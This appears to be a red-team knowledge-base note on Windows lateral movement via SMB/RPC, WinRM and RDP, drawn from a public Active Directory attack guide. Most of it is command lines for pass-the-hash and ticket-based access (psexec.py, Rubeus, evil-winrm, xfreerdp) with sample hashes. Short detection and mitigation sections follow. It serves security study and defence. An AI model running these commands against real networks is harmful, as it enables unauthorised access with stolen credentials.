---
title: Remote Execution & Lateral Movement (Windows)
aliases: ["Lateral movement", "Remote execution", "PsExec", "wmiexec", "evil-winrm", "RDP PtH"]
type: technique
domain: [red-team]
attack_tactic: [lateral-movement]
tags: [type/technique, domain/red-team, attack/lateral-movement]
source: "[[Source - zer1t0 - Attacking Active Directory]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Pass-the-Hash]]", "[[Overpass-the-Hash]]", "[[Pass-the-Ticket]]", "[[Computer Accounts]]", "[[Credential Storage in Windows]]"]
created: 2026-06-06
updated: 2026-06-06
---

# Remote Execution & Lateral Movement (Windows)

> [!summary] One-liner
> Use valid credentials (password, NT hash, or Kerberos ticket) over SMB/RPC, WinRM, or RDP to run commands on another Windows host.

## Concept abused
Windows exposes remote admin over **SMB/RPC (445/135)**, **WinRM (5985)**, and **RDP (3389)**; any of these accepts reused credentials → lateral movement.

## Prerequisites
- Valid creds for an account with rights on the target (often local admin). Credential form drives the technique: password, NT hash ([[Pass-the-Hash]]), or ticket/key ([[Pass-the-Ticket]] / [[Overpass-the-Hash]]).
- **Kerberos requires hostname/FQDN**, not IP (IP → `KDC_ERR_S_PRINCIPAL_UNKNOWN`).

## Commands & tools

### SMB/RPC — [[Impacket]] / PsExec
```bash
# Pass-the-Hash with psexec.py
psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21

# Kerberos: get a TGT then -k -no-pass
getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
export KRB5CCNAME=$(pwd)/Anakin.ccache
psexec.py contoso.local/Anakin@WS01-10 -target-ip 192.168.100.10 -k -no-pass
# (wmiexec.py is the stealthier RPC/WMI variant)
```

### WinRM / PowerShell Remoting (5985)
```powershell
# Overpass-the-Hash: inject a TGT with Rubeus, then connect natively
Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt
Enter-PSSession -ComputerName dc01
```
```bash
# from Linux
evil-winrm -i 192.168.100.10 -u Administrator -H <NT_hash>
```

### RDP (3389)
```bash
# Pass-the-Hash via FreeRDP (Restricted Admin mode required)
xfreerdp /u:Anakin@contoso.local /pth:cdeae556dc28c24b5b7b14e9df5b6e21 /v:192.168.122.143
```
> **Restricted Admin mode** (Win 8.1 / 2012R2+) lets you RDP with hash/ticket (no plaintext) and avoids caching creds on the target: inject with mimikatz/Rubeus then `mstsc.exe /restrictedadmin`.

## Detection / artifacts
Service creation (PsExec EID 7045), WMI process creation, WinRM logons (5985), RDP logon type 10 / Restricted Admin; 4624/4672 on target.

## Mitigation
LAPS, no shared local-admin, network segmentation, Protected Users for admins, restrict WinRM/RDP.

## Related
- Credential forms: [[Pass-the-Hash]] · [[Overpass-the-Hash]] · [[Pass-the-Ticket]]

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Windows computers connection"
